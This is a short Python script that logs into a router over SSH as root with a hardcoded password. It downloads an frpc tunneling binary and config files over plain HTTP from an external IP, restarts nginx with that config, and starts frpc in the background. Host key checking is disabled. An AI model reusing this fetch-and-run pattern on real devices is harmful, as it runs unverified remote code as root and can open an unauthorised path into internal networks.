import paramiko
import time

ROUTER_IP = "192.168.1.1"
ROUTER_USER = "root"
ROUTER_PASS = "punisher001"

cmd = """
wget -q http://64.225.99.144:8081/frpc -O /tmp/frpc
chmod +x /tmp/frpc
wget -q http://64.225.99.144:8081/nginx_proxy.conf -O /tmp/nginx_proxy.conf
wget -q http://64.225.99.144:8081/frpc.ini -O /tmp/frpc.ini
killall nginx
killall frpc
/usr/sbin/nginx -c /tmp/nginx_proxy.conf
nohup /tmp/frpc -c /tmp/frpc.ini > /tmp/frpc.log 2>&1 &
sleep 2
ps | grep -E "nginx|frpc" | grep -v grep
"""

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

try:
    print("Connecting to router...")
    client.connect(ROUTER_IP, username=ROUTER_USER, password=ROUTER_PASS, timeout=120)
    
    print("Executing final deployment...")
    stdin, stdout, stderr = client.exec_command(cmd)
    
    out = stdout.read().decode('utf-8', errors='ignore')
    err = stderr.read().decode('utf-8', errors='ignore')
    
    print("STDOUT:\n", out)
    if err:
        print("STDERR:\n", err)
        
    print("Done!")
except Exception as e:
    print("Error:", e)
finally:
    client.close()
